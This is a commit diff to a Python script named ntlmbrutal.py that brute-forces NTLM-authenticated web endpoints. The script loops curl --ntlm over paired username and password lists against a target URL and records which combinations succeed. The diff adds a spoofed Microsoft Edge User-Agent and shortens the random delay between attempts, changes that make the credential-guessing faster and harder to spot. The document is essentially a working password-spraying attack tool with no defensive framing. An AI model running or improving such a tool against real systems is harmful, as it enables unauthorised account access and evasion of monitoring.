Update ntlmbrutal.py with useragent

+++ ntlmbrutal.py
@@ -5,8 +5,8 @@ import time
 import random
 
 # Set delay range in milliseconds
-min_delay = 500  # Minimum delay in milliseconds
-max_delay = 9000  # Maximum delay in milliseconds
+min_delay = 100  # Minimum delay in milliseconds
+max_delay = 500  # Maximum delay in milliseconds
 
 # Read usernames and passwords from files
 users = open("usernames.txt", "r").read().splitlines()
@@ -16,8 +16,9 @@ passwords = open("passwords.txt", "r").read().splitlines()
 url = sys.argv[1]
 domain = ""
 
-# Define the curl command template
-cmd = "curl -k --ntlm -u "
+# Define the curl command template with Microsoft desktop User-Agent
+user_agent = "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64'"
+cmd = f"curl -k --ntlm -A {user_agent} -u "
 
 # Create or clear the output file
 with open("results.txt", "w") as output_file:
@@ -30,24 +31,30 @@ for i, user in enumerate(users):
         username_password = f"{domain}{user.lower()}:{passwords[i]}"
         print("Attempting: " + username_password)
         
+        # Escape the username and password in single quotes to handle special characters
+        safe_username_password = f"'{domain}{user.lower()}:{passwords[i]}'"
+        
         # Create a temporary output file for each attempt
-        os.system(f"{cmd}{username_password} {url} -o temp_output.html")
+        os.system(f"{cmd}{safe_username_password} {url} -o temp_output.html")
         
-        # Check if the file size of temp_output.html is zero
-        file_size = os.path.getsize("temp_output.html")
-        
-        # Determine if the combination is valid
-        if file_size > 0:
-            valid = "True"
+        # Check if the temp_output.html file was created successfully
+        if os.path.exists("temp_output.html"):
+            file_size = os.path.getsize("temp_output.html")
+            
+            # Determine if the combination is valid
+            if file_size > 0:
+                valid = "True"
+            else:
+                valid = "False"
+            
+            # Write the result to the output file
+            with open("results.txt", "a") as output_file:
+                output_file.write(f"{username_password} - {valid}\n")
+            
+            # Clean up the temporary file
+            os.remove("temp_output.html")
         else:
-            valid = "False"
-        
-        # Write the result to the output file
-        with open("results.txt", "a") as output_file:
-            output_file.write(f"{username_password} - {valid}\n")
-        
-        # Clean up the temporary file
-        os.remove("temp_output.html")
+            print(f"Failed to create output file for {username_password}. Skipping.")
         
         # Introduce a random delay between requests
         delay = random.uniform(min_delay, max_delay) / 1000.0  # Convert ms to seconds
